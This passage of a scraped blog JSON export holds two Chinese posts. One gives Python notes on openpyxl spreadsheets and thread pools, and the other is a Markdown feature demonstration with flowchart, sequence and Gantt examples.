import Workbookwb = Workbook()sheet = wb.activesheet.title = &quot;New Shit&quot;sheet[&apos;C3&apos;] = &apos;Hello world!&apos;for i in range(10): sheet[&quot;A%d&quot; % (i+1)].value = i + 1sheet[&quot;E1&quot;].value = &quot;=SUM(A:A)&quot;wb.save(&apos;保存一个新的excel.xlsx&apos;) 线程库 threadpool 多进程多线程和多进程：一个是 thread 库，一个是 multiprocessing 库 12345678910111213import timeimport threadpool def sayhello(str): print &quot;Hello &quot;,str time.sleep(2)name_list =[&apos;xiaozi&apos;,&apos;aa&apos;,&apos;bb&apos;,&apos;cc&apos;]start_time = time.time()pool = threadpool.ThreadPool(10) requests = threadpool.makeRequests(sayhello, name_list) [pool.putRequest(req) for req in requests] pool.wait() print &apos;%d second&apos;% (time.time()-start_time) 123456789101112131415pool = ThreadPool(poolsize) requests = makeRequests(some_callable, list_of_args, callback) [pool.putRequest(req) for req in requests] pool.wait() 第一行定义了一个线程池，表示最多可以创建poolsize这么多线程；第二行是调用makeRequests创建了要开启多线程的函数，以及函数相关参数和回调函数，其中回调函数可以不写，default是无，也就是说makeRequests只需要2个参数就可以运行；第三行用法比较奇怪，是将所有要运行多线程的请求扔进线程池，[pool.putRequest(req) for req in requests]等同于 for req in requests: pool.putRequest(req) 第四行是等待所有的线程完成工作后退出。 1234567891011121314151617181920212223242526272829import urllib2 from multiprocessing.dummy import Pool as ThreadPool urls = [ &apos;http://www.python.org&apos;, &apos;http://www.python.org/about/&apos;, &apos;http://www.onlamp.com/pub/a/python/2003/04/17/metaclasses.html&apos;, &apos;http://www.python.org/doc/&apos;, &apos;http://www.python.org/download/&apos;, &apos;http://www.python.org/getit/&apos;, &apos;http://www.python.org/community/&apos;, &apos;https://wiki.python.org/moin/&apos;, &apos;http://planet.python.org/&apos;, &apos;https://wiki.python.org/moin/LocalUserGroups&apos;, &apos;http://www.python.org/psf/&apos;, &apos;http://docs.python.org/devguide/&apos;, &apos;http://www.python.org/community/awards/&apos; # etc.. ]# Make the Pool of workerspool = ThreadPool(4) # Open the urls in their own threads# and return the resultsresults = pool.map(urllib2.urlopen, urls)#close the pool and wait for the work to finish pool.close() pool.join() ​```","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://shackles.top/tags/Python/"}]},{"title":"简单强大的Markdown","slug":"简单强大的Markdown","date":"2016-04-19T15:53:56.000Z","updated":"2018-03-31T15:18:36.616Z","comments":true,"path":"2016/04/19/简单强大的Markdown/","link":"","permalink":"https://shackles.top/2016/04/19/简单强大的Markdown/","excerpt":"","text":"简单强大的Markdown 2016-06-27 简单强大的MarkdownMarkdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，粗体 或者 斜体 某些文字，更棒的是，它还可以 1. 制作一份待办事宜 Todo 列表 支持以 PDF 格式导出文稿 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率 新增 Todo 列表功能 修复 LaTex 公式渲染问题 新增 LaTex 公式编号功能 2. 书写一个质能守恒公式[^LaTeX]E=mc2E=mc2 3. 高亮一段代码[^code]1234567@requires_authorizationclass SomeClass: passif __name__ == &apos;__main__&apos;: # A comment print &apos;hello world&apos; 4. 高效绘制 流程图123456789flowst=&gt;start: Startop=&gt;operation: Your Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op 5. 高效绘制 序列图123Alice-&gt;Bob: Hello Bob, how are you?Note right of Bob: Bob thinksBob--&gt;Alice: I am good thanks! 6. 高效绘制 甘特图12345678910111213title 项目开发流程section 项目确定 需求分析 :a1, 2016-06-22, 3d 可行性报告 :after a1, 5d 概念验证 : 5dsection 项目实施 概要设计 :2016-07-05 , 5d 详细设计 :2016-07-08, 10d 编码 :2016-07-15, 10d 测试 :2016-07-22, 5dsection 发布验收 发布: 2d 验收: 3d 7. 绘制表格 项目 价格 数量 计算机 $1600 5 手机 $12 12 管线 $1 234","categories":[],"tags":[{"name":"other","slug":"other","permalink":"https://shackles.top/tags/other/"}]}]}